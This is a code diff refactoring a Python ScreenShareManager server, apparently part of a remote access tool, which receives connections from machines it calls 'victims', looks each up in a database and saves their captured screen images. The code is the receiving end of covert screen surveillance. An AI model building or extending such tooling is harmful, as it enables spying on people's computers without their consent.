@@ -3,26 +3,20 @@ import threading
 import os
 import cv2
 import numpy as np
+from database.clients import get_client_by_socket_ip
 
 
 class ScreenShareManager():
-    def __init__(self, host, port, victimList):
+    def __init__(self, host, port):
         self.host = host
         self.port = port
         self.clients = []
-        self.victimList = victimList
-
-        # Connect it all
-        self.connect()
 
     def add_client(self):
         pass
 
     def remove_client(self):
         pass
-
-    def update_victims(self, victimList):
-        self.victimList = victimList
 
     def connect(self):
         """Handles the connection with the clients"""
@@ -45,11 +39,8 @@ class ScreenShareManager():
             print(f"[*] Connection is established successfully with {addr[0]}")
 
             # Main information about the client from other servers
-            victim = None
-            for victims in self.victimList:
-                if victims["socket_ip"] == addr[0]:
-                    victim = victims
-                    break
+            # Get the victim from the database
+            victim = get_client_by_socket_ip(addr[0])[0]
 
             # Make a thread which handles the screenshare for that client.
             t = threading.Thread(target=self.handle_client,
@@ -59,7 +50,7 @@ class ScreenShareManager():
     def handle_client(self, client_socket, victim):
         """Handles the client"""
         # Directory of where we want to save the images
-        directory = victim["SCREENSHARE_SOURCE"].replace("video.avi", "")
+        directory = victim.screen_share_source.replace("video.avi", "")
         if not os.path.exists(directory):
             os.makedirs(directory)
 
